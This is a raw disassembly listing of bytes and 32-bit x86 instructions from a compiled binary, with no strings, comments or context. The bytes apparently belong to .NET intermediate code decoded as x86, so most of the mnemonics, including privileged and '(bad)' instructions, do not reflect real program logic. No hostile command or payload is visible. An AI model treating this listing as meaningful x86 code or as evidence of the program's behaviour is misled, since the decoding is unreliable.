  404244:	1a 00                	sbb    (%eax),%al
  404246:	00 01                	add    %al,(%ecx)
  404248:	1b 30                	sbb    (%eax),%esi
  40424a:	04 00                	add    $0x0,%al
  40424c:	9c                   	pushf
  40424d:	00 00                	add    %al,(%eax)
  40424f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  404252:	00 11                	add    %dl,(%ecx)
  404254:	1d 8d 57 00 00       	sbb    $0x578d,%eax
  404259:	01 25 16 72 f8 10    	add    %esp,0x10f87216
  40425f:	00 70 a2             	add    %dh,-0x5e(%eax)
  404262:	25 17 02 a2 25       	and    $0x25a20217,%eax
  404267:	18 72 a1             	sbb    %dh,-0x5f(%edx)
  40426a:	11 00                	adc    %eax,(%eax)
  40426c:	70 a2                	jo     0x404210
  40426e:	25 19 03 a2 25       	and    $0x25a20319,%eax
  404273:	1a 72 d3             	sbb    -0x2d(%edx),%dh
  404276:	11 00                	adc    %eax,(%eax)
  404278:	70 a2                	jo     0x40421c
  40427a:	25 1b 04 a2 25       	and    $0x25a2041b,%eax
  40427f:	1c 72                	sbb    $0x72,%al
  404281:	f2 15 00 70 a2 28    	repnz adc $0x28a27000,%eax
  404287:	8f 00                	pop    (%eax)
  404289:	00 0a                	add    %cl,(%edx)
  40428b:	0a 28                	or     (%eax),%ch
  40428d:	90                   	nop
  40428e:	00 00                	add    %al,(%eax)
  404290:	0a 72 91             	or     -0x6f(%edx),%dh
  404293:	16                   	push   %ss
  404294:	00 70 28             	add    %dh,0x28(%eax)
  404297:	91                   	xchg   %eax,%ecx
  404298:	00 00                	add    %al,(%eax)
  40429a:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40429d:	02 72 b6             	add    -0x4a(%edx),%dh
  4042a0:	12 00                	adc    (%eax),%al
  4042a2:	70 28                	jo     0x4042cc
  4042a4:	92                   	xchg   %eax,%edx
  4042a5:	00 00                	add    %al,(%eax)
  4042a7:	0a 72 ba             	or     -0x46(%edx),%dh
  4042aa:	12 00                	adc    (%eax),%al
  4042ac:	70 28                	jo     0x4042d6
  4042ae:	34 00                	xor    $0x0,%al
  4042b0:	00 0a                	add    %cl,(%edx)
  4042b2:	28 2b                	sub    %ch,(%ebx)
  4042b4:	00 00                	add    %al,(%eax)
  4042b6:	0a 0b                	or     (%ebx),%cl
  4042b8:	07                   	pop    %es
  4042b9:	06                   	push   %es
  4042ba:	28 93 00 00 0a 72    	sub    %dl,0x720a0000(%ebx)
  4042c0:	c4 12                	les    (%edx),%edx
  4042c2:	00 70 72             	add    %dh,0x72(%eax)
  4042c5:	96                   	xchg   %eax,%esi
  4042c6:	06                   	push   %es
  4042c7:	00 70 07             	add    %dh,0x7(%eax)
  4042ca:	72 96                	jb     0x404262
  4042cc:	06                   	push   %es
  4042cd:	00 70 28             	add    %dh,0x28(%eax)
  4042d0:	34 00                	xor    $0x0,%al
  4042d2:	00 0a                	add    %cl,(%edx)
  4042d4:	28 25 00 00 0a 26    	sub    %ah,0x260a0000
  4042da:	20 2c 01             	and    %ch,(%ecx,%eax,1)
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	28 3a                	sub    %bh,(%edx)
  4042e1:	00 00                	add    %al,(%eax)
  4042e3:	0a 07                	or     (%edi),%al
  4042e5:	28 30                	sub    %dh,(%eax)
  4042e7:	00 00                	add    %al,(%eax)
  4042e9:	0a de                	or     %dh,%bl
  4042eb:	03 26                	add    (%esi),%esp
  4042ed:	de 00                	fiadds (%eax)
  4042ef:	2a 01                	sub    (%ecx),%al
  4042f1:	10 00                	adc    %al,(%eax)
  4042f3:	00 00                	add    %al,(%eax)
  4042f5:	00 00                	add    %al,(%eax)
  4042f7:	00 98 98 00 03 1a    	add    %bl,0x1a030098(%eax)
  4042fd:	00 00                	add    %al,(%eax)
  4042ff:	01 1e                	add    %ebx,(%esi)
  404301:	02 28                	add    (%eax),%ch
  404303:	4a                   	dec    %edx
  404304:	00 00                	add    %al,(%eax)
  404306:	0a 2a                	or     (%edx),%ch
  404308:	4e                   	dec    %esi
  404309:	28 3b                	sub    %bh,(%ebx)
  40430b:	00 00                	add    %al,(%eax)
  40430d:	0a 02                	or     (%edx),%al
  40430f:	7b 25                	jnp    0x404336
  404311:	00 00                	add    %al,(%eax)
  404313:	04 28                	add    $0x28,%al
  404315:	3e 00 00             	add    %al,%ds:(%eax)
  404318:	0a 2d ee 2a 1e 02    	or     0x21e2aee,%ch
  40431e:	28 4a 00             	sub    %cl,0x0(%edx)
  404321:	00 0a                	add    %cl,(%edx)
  404323:	2a 42 02             	sub    0x2(%edx),%al
  404326:	7b 27                	jnp    0x40434f
  404328:	00 00                	add    %al,(%eax)
  40432a:	04 03                	add    $0x3,%al
  40432c:	18 5a 18             	sbb    %bl,0x18(%edx)
  40432f:	6f                   	outsl  %ds:(%esi),(%dx)
  404330:	42                   	inc    %edx
  404331:	00 00                	add    %al,(%eax)
  404333:	0a 2a                	or     (%edx),%ch
  404335:	3a 02                	cmp    (%edx),%al
  404337:	7b 28                	jnp    0x404361
  404339:	00 00                	add    %al,(%eax)
  40433b:	04 03                	add    $0x3,%al
  40433d:	1b 6f e0             	sbb    -0x20(%edi),%ebp
  404340:	00 00                	add    %al,(%eax)
  404342:	0a 2a                	or     (%edx),%ch
  404344:	1e                   	push   %ds
  404345:	02 28                	add    (%eax),%ch
  404347:	4a                   	dec    %edx
  404348:	00 00                	add    %al,(%eax)
  40434a:	0a 2a                	or     (%edx),%ch
  40434c:	36 02 7b 29          	add    %ss:0x29(%ebx),%bh
  404350:	00 00                	add    %al,(%eax)
  404352:	04 03                	add    $0x3,%al
  404354:	6f                   	outsl  %ds:(%esi),(%dx)
  404355:	8c 00                	mov    %es,(%eax)
  404357:	00 0a                	add    %cl,(%edx)
  404359:	2a 1e                	sub    (%esi),%bl
  40435b:	02 28                	add    (%eax),%ch
  40435d:	4a                   	dec    %edx
  40435e:	00 00                	add    %al,(%eax)
  404360:	0a 2a                	or     (%edx),%ch
  404362:	4a                   	dec    %edx
  404363:	02 7b 2a             	add    0x2a(%ebx),%bh
  404366:	00 00                	add    %al,(%eax)
  404368:	04 03                	add    $0x3,%al
  40436a:	6f                   	outsl  %ds:(%esi),(%dx)
  40436b:	77 00                	ja     0x40436d
  40436d:	00 0a                	add    %cl,(%edx)
  40436f:	6f                   	outsl  %ds:(%esi),(%dx)
  404370:	8c 00                	mov    %es,(%eax)
  404372:	00 0a                	add    %cl,(%edx)
  404374:	2a 1e                	sub    (%esi),%bl
  404376:	02 28                	add    (%eax),%ch
  404378:	4a                   	dec    %edx
  404379:	00 00                	add    %al,(%eax)
  40437b:	0a 2a                	or     (%edx),%ch
  40437d:	36 02 7b 2b          	add    %ss:0x2b(%ebx),%bh
  404381:	00 00                	add    %al,(%eax)
  404383:	04 03                	add    $0x3,%al
  404385:	6f                   	outsl  %ds:(%esi),(%dx)
  404386:	8c 00                	mov    %es,(%eax)
  404388:	00 0a                	add    %cl,(%edx)
  40438a:	2a 36                	sub    (%esi),%dh
  40438c:	02 7b 2c             	add    0x2c(%ebx),%bh
  40438f:	00 00                	add    %al,(%eax)
  404391:	04 03                	add    $0x3,%al
  404393:	6f                   	outsl  %ds:(%esi),(%dx)
  404394:	8c 00                	mov    %es,(%eax)
  404396:	00 0a                	add    %cl,(%edx)
  404398:	2a 2e                	sub    (%esi),%ch
  40439a:	73 6a                	jae    0x404406
  40439c:	00 00                	add    %al,(%eax)
  40439e:	06                   	push   %es
  40439f:	80 2d 00 00 04 2a 1e 	subb   $0x1e,0x2a040000
  4043a6:	02 28                	add    (%eax),%ch
  4043a8:	4a                   	dec    %edx
  4043a9:	00 00                	add    %al,(%eax)
  4043ab:	0a 2a                	or     (%edx),%ch
  4043ad:	42                   	inc    %edx
  4043ae:	7e 13                	jle    0x4043c3
  4043b0:	00 00                	add    %al,(%eax)
  4043b2:	04 6f                	add    $0x6f,%al
  4043b4:	d4 00                	aam    $0x0
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	28 39                	sub    %bh,(%ecx)
  4043ba:	00 00                	add    %al,(%eax)
  4043bc:	06                   	push   %es
  4043bd:	2a 1e                	sub    (%esi),%bl
  4043bf:	02 28                	add    (%eax),%ch
  4043c1:	4a                   	dec    %edx
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	0a 2a                	or     (%edx),%ch
  4043c6:	00 00                	add    %al,(%eax)
  4043c8:	1b 30                	sbb    (%eax),%esi
  4043ca:	04 00                	add    $0x0,%al
  4043cc:	c0 00 00             	rolb   $0x0,(%eax)
  4043cf:	00 2d 00 00 11 73    	add    %ch,0x73110000
  4043d5:	e1 00                	loope  0x4043d7
  4043d7:	00 0a                	add    %cl,(%edx)
  4043d9:	25 7e 14 00 00       	and    $0x147e,%eax
  4043de:	04 6f                	add    $0x6f,%al
  4043e0:	e2 00                	loop   0x4043e2
  4043e2:	00 0a                	add    %cl,(%edx)
  4043e4:	25 7e 15 00 00       	and    $0x157e,%eax
  4043e9:	04 6f                	add    $0x6f,%al
  4043eb:	e3 00                	jecxz  0x4043ed
  4043ed:	00 0a                	add    %cl,(%edx)
  4043ef:	25 19 6f e4 00       	and    $0xe46f19,%eax
  4043f4:	00 0a                	add    %cl,(%edx)
  4043f6:	25 17 6f e5 00       	and    $0xe56f17,%eax
  4043fb:	00 0a                	add    %cl,(%edx)
  4043fd:	25 1c 6f e6 00       	and    $0xe66f1c,%eax
  404402:	00 0a                	add    %cl,(%edx)
  404404:	25 23 00 00 00       	and    $0x23,%eax
  404409:	00 00                	add    %al,(%eax)
  40440b:	00 24 40             	add    %ah,(%eax,%eax,2)
  40440e:	28 e7                	sub    %ah,%bh
  404410:	00 00                	add    %al,(%eax)
  404412:	0a 6f e8             	or     -0x18(%edi),%ch
  404415:	00 00                	add    %al,(%eax)
  404417:	0a 0a                	or     (%edx),%cl
  404419:	72 9b                	jb     0x4043b6
  40441b:	16                   	push   %ss
  40441c:	00 70 02             	add    %dh,0x2(%eax)
  40441f:	7b 2f                	jnp    0x404450
  404421:	00 00                	add    %al,(%eax)
  404423:	04 72                	add    $0x72,%al
  404425:	a1 16 00 70 28       	mov    0x28700016,%eax
  40442a:	34 00                	xor    $0x0,%al
  40442c:	00 0a                	add    %cl,(%edx)
  40442e:	06                   	push   %es
  40442f:	73 e9                	jae    0x40441a
  404431:	00 00                	add    %al,(%eax)
  404433:	0a 0b                	or     (%ebx),%cl
  404435:	07                   	pop    %es
  404436:	6f                   	outsl  %ds:(%esi),(%dx)
  404437:	4e                   	dec    %esi
  404438:	00 00                	add    %al,(%eax)
  40443a:	0a 07                	or     (%edi),%al
  40443c:	6f                   	outsl  %ds:(%esi),(%dx)
  40443d:	ea 00 00 0a 2d 02 de 	ljmp   $0xde02,$0x2d0a0000
  404444:	4e                   	dec    %esi
  404445:	07                   	pop    %es
  404446:	72 b9                	jb     0x404401
  404448:	16                   	push   %ss
  404449:	00 70 73             	add    %dh,0x73(%eax)
  40444c:	4f                   	dec    %edi
  40444d:	00 00                	add    %al,(%eax)
  40444f:	0a 14 73             	or     (%ebx,%esi,2),%dl
  404452:	50                   	push   %eax
  404453:	00 00                	add    %al,(%eax)
  404455:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404458:	72 d5                	jb     0x40442f
  40445a:	16                   	push   %ss
  40445b:	00 70 6f             	add    %dh,0x6f(%eax)
  40445e:	eb 00                	jmp    0x404460
  404460:	00 0a                	add    %cl,(%edx)
  404462:	0d 09 72 e3 16       	or     $0x16e37209,%eax
  404467:	00 70 02             	add    %dh,0x2(%eax)
  40446a:	7b 30                	jnp    0x40449c
  40446c:	00 00                	add    %al,(%eax)
  40446e:	04 6f                	add    $0x6f,%al
  404470:	52                   	push   %edx
  404471:	00 00                	add    %al,(%eax)
  404473:	0a 08                	or     (%eax),%cl
  404475:	72 d5                	jb     0x40444c
  404477:	16                   	push   %ss
  404478:	00 70 09             	add    %dh,0x9(%eax)
  40447b:	14 6f                	adc    $0x6f,%al
  40447d:	ec                   	in     (%dx),%al
  40447e:	00 00                	add    %al,(%eax)
  404480:	0a 26                	or     (%esi),%ah
  404482:	de 0a                	fimuls (%edx)
  404484:	08 2c 06             	or     %ch,(%esi,%eax,1)
  404487:	08 6f 70             	or     %ch,0x70(%edi)
  40448a:	00 00                	add    %al,(%eax)
  40448c:	0a dc                	or     %ah,%bl
  40448e:	de 03                	fiadds (%ebx)
  404490:	26 de 00             	fiadds %es:(%eax)
  404493:	2a 01                	sub    (%ecx),%al
  404495:	1c 00                	sbb    $0x0,%al
  404497:	00 02                	add    %al,(%edx)
  404499:	00 83 00 2d b0 00    	add    %al,0xb02d00(%ebx)
  40449f:	0a 00                	or     (%eax),%al
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 00                	add    %al,(%eax)
  4044a5:	00 00                	add    %al,(%eax)
  4044a7:	00 bc bc 00 03 13 00 	add    %bh,0x130300(%esp,%edi,4)
  4044ae:	00 01                	add    %al,(%ecx)
  4044b0:	1e                   	push   %ds
  4044b1:	02 28                	add    (%eax),%ch
  4044b3:	4a                   	dec    %edx
  4044b4:	00 00                	add    %al,(%eax)
  4044b6:	0a 2a                	or     (%edx),%ch
  4044b8:	1e                   	push   %ds
  4044b9:	02 28                	add    (%eax),%ch
  4044bb:	4a                   	dec    %edx
  4044bc:	00 00                	add    %al,(%eax)
  4044be:	0a 2a                	or     (%edx),%ch
  4044c0:	13 30                	adc    (%eax),%esi
  4044c2:	02 00                	add    (%eax),%al
  4044c4:	37                   	aaa
  4044c5:	00 00                	add    %al,(%eax)
  4044c7:	00 2e                	add    %ch,(%esi)
  4044c9:	00 00                	add    %al,(%eax)
  4044cb:	11 12                	adc    %edx,(%edx)
  4044cd:	00 28                	add    %ch,(%eax)
  4044cf:	94                   	xchg   %eax,%esp
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	0a 7d 57             	or     0x57(%ebp),%bh
  4044d5:	00 00                	add    %al,(%eax)
  4044d7:	04 12                	add    $0x12,%al
  4044d9:	00 02                	add    %al,(%edx)
  4044db:	7d 58                	jge    0x404535
  4044dd:	00 00                	add    %al,(%eax)
  4044df:	04 12                	add    $0x12,%al
  4044e1:	00 15 7d 56 00 00    	add    %dl,0x567d
  4044e7:	04 12                	add    $0x12,%al
  4044e9:	00 7c 57 00          	add    %bh,0x0(%edi,%edx,2)
  4044ed:	00 04 12             	add    %al,(%edx,%edx,1)
  4044f0:	00 28                	add    %ch,(%eax)
  4044f2:	08 00                	or     %al,(%eax)
  4044f4:	00 2b                	add    %ch,(%ebx)
  4044f6:	12 00                	adc    (%eax),%al
  4044f8:	7c 57                	jl     0x404551
  4044fa:	00 00                	add    %al,(%eax)
  4044fc:	04 28                	add    $0x28,%al
  4044fe:	96                   	xchg   %eax,%esi
  4044ff:	00 00                	add    %al,(%eax)
  404501:	0a 2a                	or     (%edx),%ch
  404503:	00 1b                	add    %bl,(%ebx)
  404505:	30 04 00             	xor    %al,(%eax,%eax,1)
  404508:	a0 02 00 00 2f       	mov    0x2f000002,%al
  40450d:	00 00                	add    %al,(%eax)
  40450f:	11 02                	adc    %eax,(%edx)
  404511:	7b 35                	jnp    0x404548
  404513:	00 00                	add    %al,(%eax)
  404515:	04 0a                	add    $0xa,%al
  404517:	06                   	push   %es
  404518:	45                   	inc    %ebp
  404519:	03 00                	add    (%eax),%eax
  40451b:	00 00                	add    %al,(%eax)
  40451d:	61                   	popa
  40451e:	00 00                	add    %al,(%eax)
  404520:	00 68 01             	add    %ch,0x1(%eax)
  404523:	00 00                	add    %al,(%eax)
  404525:	0d 02 00 00 02       	or     $0x2000002,%eax
  40452a:	73 6e                	jae    0x40459a
  40452c:	00 00                	add    %al,(%eax)
  40452e:	06                   	push   %es
  40452f:	7d 37                	jge    0x404568
  404531:	00 00                	add    %al,(%eax)
  404533:	04 7e                	add    $0x7e,%al
  404535:	2e 00 00             	add    %al,%cs:(%eax)
  404538:	04 25                	add    $0x25,%al
  40453a:	2d 17 26 7e 2d       	sub    $0x2d7e2617,%eax
  40453f:	00 00                	add    %al,(%eax)
  404541:	04 fe                	add    $0xfe,%al
  404543:	06                   	push   %es
  404544:	6b 00 00             	imul   $0x0,(%eax),%eax
  404547:	06                   	push   %es
  404548:	73 ed                	jae    0x404537
  40454a:	00 00                	add    %al,(%eax)
  40454c:	0a 25 80 2e 00 00    	or     0x2e80,%ah
  404552:	04 28                	add    $0x28,%al
  404554:	ee                   	out    %al,(%dx)
  404555:	00 00                	add    %al,(%eax)
  404557:	0a 6f ca             	or     -0x36(%edi),%ch
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 0b                	or     (%ebx),%cl
  40455e:	12 01                	adc    (%ecx),%al
  404560:	28 ef                	sub    %ch,%bh
  404562:	00 00                	add    %al,(%eax)
  404564:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  40456a:	0a 7d 35             	or     0x35(%ebp),%bh
  40456d:	00 00                	add    %al,(%eax)
  40456f:	04 02                	add    $0x2,%al
  404571:	07                   	pop    %es
  404572:	7d 3b                	jge    0x4045af
  404574:	00 00                	add    %al,(%eax)
  404576:	04 02                	add    $0x2,%al
  404578:	7c 36                	jl     0x4045b0
  40457a:	00 00                	add    %al,(%eax)
  40457c:	04 12                	add    $0x12,%al
  40457e:	01 02                	add    %eax,(%edx)
  404580:	28 09                	sub    %cl,(%ecx)
  404582:	00 00                	add    %al,(%eax)
  404584:	2b dd                	sub    %ebp,%ebx
  404586:	25 02 00 00 02       	and    $0x2000002,%eax
  40458b:	7b 3b                	jnp    0x4045c8
  40458d:	00 00                	add    %al,(%eax)
  40458f:	04 0b                	add    $0xb,%al
  404591:	02 7c 3b 00          	add    0x0(%ebx,%edi,1),%bh
  404595:	00 04 fe             	add    %al,(%esi,%edi,8)
  404598:	15 3a 00 00 01       	adc    $0x100003a,%eax
  40459d:	02 15 25 0a 7d 35    	add    0x357d0a25,%dl
  4045a3:	00 00                	add    %al,(%eax)
  4045a5:	04 12                	add    $0x12,%al
  4045a7:	01 28                	add    %ebp,(%eax)
  4045a9:	cb                   	lret
  4045aa:	00 00                	add    %al,(%eax)
  4045ac:	0a 02                	or     (%edx),%al
  4045ae:	7b 37                	jnp    0x4045e7
  4045b0:	00 00                	add    %al,(%eax)
  4045b2:	04 28                	add    $0x28,%al
  4045b4:	31 00                	xor    %eax,(%eax)
  4045b6:	00 0a                	add    %cl,(%edx)
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	32 00                	xor    (%eax),%al
  4045bb:	00 0a                	add    %cl,(%edx)
  4045bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4045be:	33 00                	xor    (%eax),%eax
  4045c0:	00 0a                	add    %cl,(%edx)
  4045c2:	7d 31                	jge    0x4045f5
  4045c4:	00 00                	add    %al,(%eax)
  4045c6:	04 02                	add    $0x2,%al
  4045c8:	28 3b                	sub    %bh,(%ebx)
  4045ca:	00 00                	add    %al,(%eax)
  4045cc:	06                   	push   %es
  4045cd:	7d 39                	jge    0x404608
  4045cf:	00 00                	add    %al,(%eax)
  4045d1:	04 02                	add    $0x2,%al
  4045d3:	7b 39                	jnp    0x40460e
  4045d5:	00 00                	add    %al,(%eax)
  4045d7:	04 2d                	add    $0x2d,%al
  4045d9:	05 dd a8 01 00       	add    $0x1a8dd,%eax
  4045de:	00 02                	add    %al,(%edx)
  4045e0:	7b 37                	jnp    0x404619
  4045e2:	00 00                	add    %al,(%eax)
  4045e4:	04 1f                	add    $0x1f,%al
  4045e6:	28 73 f1             	sub    %dh,-0xf(%ebx)
  4045e9:	00 00                	add    %al,(%eax)
  4045eb:	0a 7d 32             	or     0x32(%ebp),%bh
  4045ee:	00 00                	add    %al,(%eax)
  4045f0:	04 02                	add    $0x2,%al
  4045f2:	73 f2                	jae    0x4045e6
  4045f4:	00 00                	add    %al,(%eax)
  4045f6:	0a 7d 3a             	or     0x3a(%ebp),%bh
  4045f9:	00 00                	add    %al,(%eax)
  4045fb:	04 02                	add    $0x2,%al
  4045fd:	17                   	pop    %ss
  4045fe:	7d 3c                	jge    0x40463c
  404600:	00 00                	add    %al,(%eax)
  404602:	04 38                	add    $0x38,%al
  404604:	e4 00                	in     $0x0,%al
  404606:	00 00                	add    %al,(%eax)
  404608:	02 73 6f             	add    0x6f(%ebx),%dh
  40460b:	00 00                	add    %al,(%eax)
  40460d:	06                   	push   %es
  40460e:	7d 38                	jge    0x404648
  404610:	00 00                	add    %al,(%eax)
  404612:	04 02                	add    $0x2,%al
  404614:	7b 38                	jnp    0x40464e
  404616:	00 00                	add    %al,(%eax)
  404618:	04 02                	add    $0x2,%al
  40461a:	7b 37                	jnp    0x404653
  40461c:	00 00                	add    %al,(%eax)
  40461e:	04 7d                	add    $0x7d,%al
  404620:	34 00                	xor    $0x0,%al
  404622:	00 04 02             	add    %al,(%edx,%eax,1)
  404625:	7b 38                	jnp    0x40465f
  404627:	00 00                	add    %al,(%eax)
  404629:	04 72                	add    $0x72,%al
  40462b:	fb                   	sti
  40462c:	16                   	push   %ss
  40462d:	00 70 02             	add    %dh,0x2(%eax)
  404630:	7b 39                	jnp    0x40466b
  404632:	00 00                	add    %al,(%eax)
  404634:	04 02                	add    $0x2,%al
  404636:	7b 3c                	jnp    0x404674
  404638:	00 00                	add    %al,(%eax)
  40463a:	04 8c                	add    $0x8c,%al
  40463c:	47                   	inc    %edi
  40463d:	00 00                	add    %al,(%eax)
  40463f:	01 28                	add    %ebp,(%eax)
  404641:	f3 00 00             	repz add %al,(%eax)
  404644:	0a 7d 33             	or     0x33(%ebp),%bh
  404647:	00 00                	add    %al,(%eax)
  404649:	04 02                	add    $0x2,%al
  40464b:	7b 38                	jnp    0x404685
  40464d:	00 00                	add    %al,(%eax)
  40464f:	04 7b                	add    $0x7b,%al
  404651:	34 00                	xor    $0x0,%al
  404653:	00 04 7b             	add    %al,(%ebx,%edi,2)
  404656:	32 00                	xor    (%eax),%al
  404658:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40465b:	f4                   	hlt
  40465c:	00 00                	add    %al,(%eax)
  40465e:	0a 6f ca             	or     -0x36(%edi),%ch
  404661:	00 00                	add    %al,(%eax)
  404663:	0a 0b                	or     (%ebx),%cl
  404665:	12 01                	adc    (%ecx),%al
  404667:	28 ef                	sub    %ch,%bh
  404669:	00 00                	add    %al,(%eax)
  40466b:	0a 2d 3f 02 17 25    	or     0x2517023f,%ch
  404671:	0a 7d 35             	or     0x35(%ebp),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 02                	add    $0x2,%al
  404678:	07                   	pop    %es
  404679:	7d 3b                	jge    0x4046b6
  40467b:	00 00                	add    %al,(%eax)
  40467d:	04 02                	add    $0x2,%al
  40467f:	7c 36                	jl     0x4046b7
  404681:	00 00                	add    %al,(%eax)
  404683:	04 12                	add    $0x12,%al
  404685:	01 02                	add    %eax,(%edx)
  404687:	28 09                	sub    %cl,(%ecx)
  404689:	00 00                	add    %al,(%eax)
  40468b:	2b dd                	sub    %ebp,%ebx
  40468d:	1e                   	push   %ds
  40468e:	01 00                	add    %eax,(%eax)
  404690:	00 02                	add    %al,(%edx)
  404692:	7b 3b                	jnp    0x4046cf
  404694:	00 00                	add    %al,(%eax)
  404696:	04 0b                	add    $0xb,%al
  404698:	02 7c 3b 00          	add    0x0(%ebx,%edi,1),%bh
  40469c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40469f:	15 3a 00 00 01       	adc    $0x100003a,%eax
  4046a4:	02 15 25 0a 7d 35    	add    0x357d0a25,%dl
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	04 12                	add    $0x12,%al
  4046ae:	01 28                	add    %ebp,(%eax)
  4046b0:	cb                   	lret
  4046b1:	00 00                	add    %al,(%eax)
  4046b3:	0a 02                	or     (%edx),%al
  4046b5:	7b 3a                	jnp    0x4046f1
  4046b7:	00 00                	add    %al,(%eax)
  4046b9:	04 02                	add    $0x2,%al
  4046bb:	7b 38                	jnp    0x4046f5
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	04 fe                	add    $0xfe,%al
  4046c1:	06                   	push   %es
  4046c2:	70 00                	jo     0x4046c4
  4046c4:	00 06                	add    %al,(%esi)
  4046c6:	73 d3                	jae    0x40469b
  4046c8:	00 00                	add    %al,(%eax)
  4046ca:	0a 28                	or     (%eax),%ch
  4046cc:	f5                   	cmc
  4046cd:	00 00                	add    %al,(%eax)
  4046cf:	0a 6f f6             	or     -0xa(%edi),%ch
  4046d2:	00 00                	add    %al,(%eax)
  4046d4:	0a 02                	or     (%edx),%al
  4046d6:	14 7d                	adc    $0x7d,%al
  4046d8:	38 00                	cmp    %al,(%eax)
  4046da:	00 04 02             	add    %al,(%edx,%eax,1)
  4046dd:	7b 3c                	jnp    0x40471b
  4046df:	00 00                	add    %al,(%eax)
  4046e1:	04 0c                	add    $0xc,%al
  4046e3:	02 08                	add    (%eax),%cl
  4046e5:	17                   	pop    %ss
  4046e6:	58                   	pop    %eax
  4046e7:	7d 3c                	jge    0x404725
  4046e9:	00 00                	add    %al,(%eax)
  4046eb:	04 02                	add    $0x2,%al
  4046ed:	7b 3c                	jnp    0x40472b
  4046ef:	00 00                	add    %al,(%eax)
  4046f1:	04 20                	add    $0x20,%al
  4046f3:	ff 00                	incl   (%eax)
  4046f5:	00 00                	add    %al,(%eax)
  4046f7:	3f                   	aas
  4046f8:	0c ff                	or     $0xff,%al
  4046fa:	ff                   	(bad)
  4046fb:	ff 02                	incl   (%edx)
  4046fd:	7b 3a                	jnp    0x404739
  4046ff:	00 00                	add    %al,(%eax)
  404701:	04 28                	add    $0x28,%al
  404703:	f7 00 00 0a 6f ca    	testl  $0xca6f0a00,(%eax)
  404709:	00 00                	add    %al,(%eax)
  40470b:	0a 0b                	or     (%ebx),%cl
  40470d:	12 01                	adc    (%ecx),%al
  40470f:	28 ef                	sub    %ch,%bh
  404711:	00 00                	add    %al,(%eax)
  404713:	0a 2d 3c 02 18 25    	or     0x2518023c,%ch
  404719:	0a 7d 35             	or     0x35(%ebp),%bh
  40471c:	00 00                	add    %al,(%eax)
  40471e:	04 02                	add    $0x2,%al
  404720:	07                   	pop    %es
  404721:	7d 3b                	jge    0x40475e
  404723:	00 00                	add    %al,(%eax)
  404725:	04 02                	add    $0x2,%al
  404727:	7c 36                	jl     0x40475f
  404729:	00 00                	add    %al,(%eax)
  40472b:	04 12                	add    $0x12,%al
  40472d:	01 02                	add    %eax,(%edx)
  40472f:	28 09                	sub    %cl,(%ecx)
  404731:	00 00                	add    %al,(%eax)
  404733:	2b de                	sub    %esi,%ebx
  404735:	79 02                	jns    0x404739
  404737:	7b 3b                	jnp    0x404774
  404739:	00 00                	add    %al,(%eax)
  40473b:	04 0b                	add    $0xb,%al
  40473d:	02 7c 3b 00          	add    0x0(%ebx,%edi,1),%bh
  404741:	00 04 fe             	add    %al,(%esi,%edi,8)
  404744:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404749:	02 15 25 0a 7d 35    	add    0x357d0a25,%dl
  40474f:	00 00                	add    %al,(%eax)
  404751:	04 12                	add    $0x12,%al
  404753:	01 28                	add    %ebp,(%eax)
  404755:	cb                   	lret
  404756:	00 00                	add    %al,(%eax)
  404758:	0a de                	or     %dh,%bl
  40475a:	2c 0d                	sub    $0xd,%al
  40475c:	02 1f                	add    (%edi),%bl
  40475e:	fe                   	(bad)
  40475f:	7d 35                	jge    0x404796
  404761:	00 00                	add    %al,(%eax)
  404763:	04 02                	add    $0x2,%al
  404765:	14 7d                	adc    $0x7d,%al
  404767:	37                   	aaa
  404768:	00 00                	add    %al,(%eax)
  40476a:	04 02                	add    $0x2,%al
  40476c:	14 7d                	adc    $0x7d,%al
  40476e:	39 00                	cmp    %eax,(%eax)
  404770:	00 04 02             	add    %al,(%edx,%eax,1)
  404773:	14 7d                	adc    $0x7d,%al
  404775:	3a 00                	cmp    (%eax),%al
  404777:	00 04 02             	add    %al,(%edx,%eax,1)
  40477a:	7c 36                	jl     0x4047b2
  40477c:	00 00                	add    %al,(%eax)
  40477e:	04 09                	add    $0x9,%al
  404780:	28 f8                	sub    %bh,%al
  404782:	00 00                	add    %al,(%eax)
  404784:	0a de                	or     %dh,%bl
  404786:	28 02                	sub    %al,(%edx)
  404788:	1f                   	pop    %ds
  404789:	fe                   	(bad)
  40478a:	7d 35                	jge    0x4047c1
  40478c:	00 00                	add    %al,(%eax)
  40478e:	04 02                	add    $0x2,%al
  404790:	14 7d                	adc    $0x7d,%al
  404792:	37                   	aaa
  404793:	00 00                	add    %al,(%eax)
  404795:	04 02                	add    $0x2,%al
  404797:	14 7d                	adc    $0x7d,%al
  404799:	39 00                	cmp    %eax,(%eax)
  40479b:	00 04 02             	add    %al,(%edx,%eax,1)
  40479e:	14 7d                	adc    $0x7d,%al
  4047a0:	3a 00                	cmp    (%eax),%al
  4047a2:	00 04 02             	add    %al,(%edx,%eax,1)
  4047a5:	7c 36                	jl     0x4047dd
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	04 28                	add    $0x28,%al
  4047ab:	f9                   	stc
  4047ac:	00 00                	add    %al,(%eax)
  4047ae:	0a 2a                	or     (%edx),%ch
  4047b0:	41                   	inc    %ecx
  4047b1:	1c 00                	sbb    $0x0,%al
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	00 00                	add    %al,(%eax)
  4047b7:	00 07                	add    %al,(%edi)
  4047b9:	00 00                	add    %al,(%eax)
  4047bb:	00 44 02 00          	add    %al,0x0(%edx,%eax,1)
  4047bf:	00 4b 02             	add    %cl,0x2(%ebx)
  4047c2:	00 00                	add    %al,(%eax)
  4047c4:	2c 00                	sub    $0x0,%al
  4047c6:	00 00                	add    %al,(%eax)
